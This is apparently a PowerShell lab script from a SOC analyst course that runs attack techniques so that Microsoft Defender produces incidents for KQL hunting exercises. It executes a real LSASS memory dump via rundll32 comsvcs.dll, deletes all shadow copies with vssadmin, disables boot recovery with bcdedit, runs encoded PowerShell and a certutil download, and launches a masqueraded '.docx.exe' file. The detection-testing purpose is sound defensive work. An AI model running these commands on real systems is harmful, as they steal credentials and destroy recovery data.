<#
.SYNOPSIS
    Simulate Lab Attacks & Generate Live Defender Incidents for Aayushi@seojupitor.com
.DESCRIPTION
    This script safely simulates adversary behaviors on a Windows endpoint onboarded to Microsoft Defender for Endpoint (MDE).
    It generates high-fidelity telemetry specifically designed to match the KQL hunting queries in Episode 08:
      - Query 1: Suspicious PowerShell Encoded Commands & Web Downloads (T1059.001)
      - Query 2: LOLBin Tool Ingress via certutil.exe (T1105)
      - Query 3: Credential Dumping via rundll32.exe comsvcs.dll targeting LSASS (T1003.001)
      - Query 6: Ransomware Inhibit System Recovery via vssadmin & bcdedit (T1490)
    
    Defender for Endpoint and Defender XDR will correlate these behaviors and open 1-2 live Incidents
    in the Defender portal (https://security.microsoft.com/incidents) linked to the active user and device!
.NOTES
    Course: Microsoft Security Stack / SOC Analyst Full Course | Cloud Knowledge
    Episode: 08 (Using Threat Analytics & Advanced Hunting with KQL)
    Target User: Aayushi@seojupitor.com
#>

[CmdletBinding()]
param (
    [Parameter(Mandatory = $false)]
    [string]$TargetUser = "Aayushi@seojupitor.com"
)

Write-Host "==================================================================" -ForegroundColor Cyan
Write-Host "   Cloud Knowledge: Defender Incident & Hunting Telemetry Lab    " -ForegroundColor Cyan
Write-Host "   Target Persona: $TargetUser                                    " -ForegroundColor Cyan
Write-Host "==================================================================" -ForegroundColor Cyan
Write-Host ""

$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Host "[*] Current Windows Context: $CurrentUser" -ForegroundColor Yellow

$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $IsAdmin) {
    Write-Warning "[!] For full telemetry fidelity (especially LSASS & vssadmin simulation), running in an Elevated PowerShell (Run as Administrator) is strongly recommended."
}

# Define working scratch directory
$LabDir = "C:\Users\Public\LabSimulations"
if (-not (Test-Path $LabDir)) {
    New-Item -ItemType Directory -Path $LabDir -Force | Out-Null
}

Write-Host "`nSelect an action to execute:" -ForegroundColor Green
Write-Host "  [1] Generate Incident 1: Credential Theft & LOLBins (Queries 1, 2, 3)" -ForegroundColor White
Write-Host "  [2] Generate Incident 2: Ransomware Shadow Copy Tampering (Query 6 - Custom Detection)" -ForegroundColor White
Write-Host "  [3] Generate Cross-Domain Phishing Simulation Artifacts (Query 5)" -ForegroundColor White
Write-Host "  [4] Run ALL Simulations (Recommended for Full Lab Setup)" -ForegroundColor Magenta
Write-Host "  [Q] Quit" -ForegroundColor Gray
Write-Host ""

$choice = Read-Host "Enter your choice [1/2/3/4/Q]"

function Invoke-Incident1-CredentialTheftAndLOLBins {
    Write-Host "`n==================================================================" -ForegroundColor Yellow
    Write-Host "  SIMULATION 1: Credential Access & LOLBin Ingress Attack Chain  " -ForegroundColor Yellow
    Write-Host "  (Matches Lab Queries 1, 2, and 3)                              " -ForegroundColor Yellow
    Write-Host "==================================================================" -ForegroundColor Yellow

    # Step 1.1: Query 2 - LOLBin certutil tool download
    Write-Host "`n[*] [Step 1/3] Simulating LOLBin Ingress via certutil.exe (Query 2 - T1105)..." -ForegroundColor Cyan
    $CertutilTarget = "$LabDir\stage2_payload.txt"
    $CertutilCmd = "certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Azure/azure-quickstart-templates/master/README.md `"$CertutilTarget`""
    Write-Host "  Executing: $CertutilCmd" -ForegroundColor Gray
    try {
        Start-Process -FilePath "certutil.exe" -ArgumentList "-urlcache -split -f https://raw.githubusercontent.com/Azure/azure-quickstart-templates/master/README.md `"$CertutilTarget`"" -Wait -NoNewWindow
        Write-Host "  [+] certutil execution completed and logged to DeviceProcessEvents." -ForegroundColor Green
    } catch {
        Write-Host "  [!] Error executing certutil: $_" -ForegroundColor Red
    }

    # Step 1.2: Query 1 - Suspicious Encoded PowerShell Execution
    Write-Host "`n[*] [Step 2/3] Simulating Suspicious Encoded PowerShell Execution (Query 1 - T1059.001)..." -ForegroundColor Cyan
    $ScriptBlockText = "Write-Output 'Simulated payload execution for user $TargetUser'; Start-Sleep -Seconds 1"
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ScriptBlockText)
    $Encoded = [System.Convert]::ToBase64String($Bytes)
    $PSCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -enc $Encoded"
    Write-Host "  Executing: $PSCmd" -ForegroundColor Gray
    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -enc $Encoded" -Wait -NoNewWindow
        Write-Host "  [+] Encoded PowerShell completed and logged to DeviceProcessEvents." -ForegroundColor Green
    } catch {
        Write-Host "  [!] Error executing PowerShell: $_" -ForegroundColor Red
    }

    # Step 1.3: Query 3 - LSASS Memory Dumping via comsvcs.dll & rundll32.exe
    Write-Host "`n[*] [Step 3/3] Simulating LSASS Dumping via comsvcs.dll & rundll32 (Query 3 - T1003.001)..." -ForegroundColor Cyan
    $DumpOutput = "$LabDir\lsass_simulated.dmp"
    $LsassProc = Get-Process -Name "lsass" -ErrorAction SilentlyContinue
    $LsassPid = if ($LsassProc) { $LsassProc.Id } else { 624 }
    
    # We call comsvcs.dll MiniDump. Defender's EDR engine monitors rundll32.exe calling comsvcs.dll with MiniDump.
    $Rundll32Args = "C:\Windows\System32\comsvcs.dll, MiniDump $LsassPid `"$DumpOutput`" full"
    Write-Host "  Executing: rundll32.exe $Rundll32Args" -ForegroundColor Gray
    try {
        Start-Process -FilePath "rundll32.exe" -ArgumentList $Rundll32Args -Wait -NoNewWindow
        Write-Host "  [+] rundll32 LSASS dump execution completed and logged to DeviceProcessEvents." -ForegroundColor Green
    } catch {
        Write-Host "  [!] Note: rundll32 may be blocked by Defender Attack Surface Reduction (ASR) or Credential Guard; this block itself generates high-severity alert telemetry!" -ForegroundColor Yellow
    }

    Write-Host "`n[+] INCIDENT 1 SIMULATION COMPLETE!" -ForegroundColor Green
    Write-Host "    Expected Defender Alert: 'Access to LSASS memory using comsvcs.dll' or 'Suspicious process execution'" -ForegroundColor Cyan
    Write-Host "    Expected Defender Incident: High/Medium Severity Incident in security.microsoft.com/incidents" -ForegroundColor Cyan
    Write-Host "    Ingestion Delay: Typically 2 to 7 minutes for full XDR correlation." -ForegroundColor White
}

function Invoke-Incident2-RansomwareTampering {
    Write-Host "`n==================================================================" -ForegroundColor Yellow
    Write-Host "  SIMULATION 2: Ransomware Recovery Tampering (vssadmin & bcdedit) " -ForegroundColor Yellow
    Write-Host "  (Matches Lab Query 6 - Custom Detection Rule - T1490)           " -ForegroundColor Yellow
    Write-Host "==================================================================" -ForegroundColor Yellow

    Write-Host "`n[*] Executing Volume Shadow Copy deletion command..." -ForegroundColor Cyan
    # Note: Even if no shadow copies exist or command returns benign error, DeviceProcessEvents records the exact command line!
    $Cmd1 = "vssadmin delete shadows /all /quiet"
    Write-Host "  Executing: cmd.exe /c `"$Cmd1`"" -ForegroundColor Gray
    try {
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$Cmd1`"" -Wait -NoNewWindow
        Write-Host "  [+] vssadmin command logged to DeviceProcessEvents." -ForegroundColor Green
    } catch {
        Write-Host "  [!] Error: $_" -ForegroundColor Red
    }

    Write-Host "`n[*] Executing bcdedit boot recovery tampering command..." -ForegroundColor Cyan
    $Cmd2 = "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
    Write-Host "  Executing: cmd.exe /c `"$Cmd2`"" -ForegroundColor Gray
    try {
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$Cmd2`"" -Wait -NoNewWindow
        Write-Host "  [+] bcdedit command logged to DeviceProcessEvents." -ForegroundColor Green
    } catch {
        Write-Host "  [!] Error: $_" -ForegroundColor Red
    }

    Write-Host "`n[+] INCIDENT 2 SIMULATION COMPLETE!" -ForegroundColor Green
    Write-Host "    If your Custom Detection Rule from Part 8 is deployed, Defender will generate:" -ForegroundColor Cyan
    Write-Host "    Incident: 'Suspicious Volume Shadow Copy Deletion Detected' on user $TargetUser" -ForegroundColor Cyan
}

function Invoke-Incident3-PhishingArtifacts {
    Write-Host "`n==================================================================" -ForegroundColor Yellow
    Write-Host "  SIMULATION 3: Cross-Domain Phishing & Execution Artifacts      " -ForegroundColor Yellow
    Write-Host "  (Matches Lab Query 5 - EmailEvents & DeviceProcessEvents Join)  " -ForegroundColor Yellow
    Write-Host "==================================================================" -ForegroundColor Yellow

    $AttachmentName = "Quarterly_Bonus_Plan.docx.exe"
    $TargetExePath = "$LabDir\$AttachmentName"
    
    Write-Host "`n[*] Creating simulated executable payload '$AttachmentName'..." -ForegroundColor Cyan
    # Copy cmd.exe or notepad.exe as the dummy payload
    Copy-Item -Path "C:\Windows\System32\cmd.exe" -Destination $TargetExePath -Force
    
    Write-Host "[*] Launching simulated attachment payload..." -ForegroundColor Cyan
    Start-Process -FilePath $TargetExePath -ArgumentList "/c echo Payload executed by $TargetUser && timeout /t 2" -Wait -NoNewWindow
    Write-Host "  [+] Process execution logged for '$AttachmentName' in DeviceProcessEvents." -ForegroundColor Green

    Write-Host "`n[i] Cross-Domain Phishing Email Setup:" -ForegroundColor Yellow
    Write-Host "    To light up Query 5 in the lab, send an email to '$TargetUser' with attachment named:" -ForegroundColor White
    Write-Host "    '$AttachmentName'" -ForegroundColor Cyan
    Write-Host "    Once delivered, Query 5 will join EmailEvents and DeviceProcessEvents perfectly!" -ForegroundColor Green
}

switch ($choice) {
    "1" { Invoke-Incident1-CredentialTheftAndLOLBins }
    "2" { Invoke-Incident2-RansomwareTampering }
    "3" { Invoke-Incident3-PhishingArtifacts }
    "4" {
        Invoke-Incident1-CredentialTheftAndLOLBins
        Invoke-Incident2-RansomwareTampering
        Invoke-Incident3-PhishingArtifacts
    }
    Default { Write-Host "`nExiting. No commands executed." -ForegroundColor Gray }
}

Write-Host "`n==================================================================" -ForegroundColor Cyan
Write-Host "  Lab Telemetry Generation Finished!                              " -ForegroundColor Cyan
Write-Host "  Next Steps for Episode 08 Lab Demonstration:                    " -ForegroundColor Cyan
Write-Host "  1. Wait 3-5 minutes for Defender XDR to ingest events.          " -ForegroundColor White
Write-Host "  2. In Defender Portal -> Advanced Hunting, execute:             " -ForegroundColor White
Write-Host "     ThreatHuntingQueries.kql (Query 1, 2, 3, 4, 6)               " -ForegroundColor Yellow
Write-Host "  3. In Defender Portal -> Incidents & alerts -> Incidents:       " -ForegroundColor White
Write-Host "     Look for the newly populated incident on $TargetUser         " -ForegroundColor Yellow
Write-Host "  4. Use the incident to perform the Part 7 'Go Hunt' pivot!      " -ForegroundColor Green
Write-Host "==================================================================" -ForegroundColor Cyan
